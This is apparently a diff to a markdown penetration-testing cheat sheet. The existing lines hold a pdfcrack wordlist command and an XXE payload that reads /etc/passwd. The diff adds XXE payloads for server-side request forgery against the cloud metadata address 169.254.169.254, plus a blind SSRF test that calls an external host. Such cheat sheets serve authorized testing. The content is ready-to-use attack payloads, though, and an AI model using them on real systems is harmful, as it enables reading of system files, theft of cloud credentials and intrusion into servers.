@@ -43,3 +43,8 @@ pdfcrack -f locked.pdf -w rockyou.txt
 <!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck> 
 ```
+### SSRF 
+`<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> `
+### blind SSRF test with your own server
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://toto.afri.ca"> ]> 
+
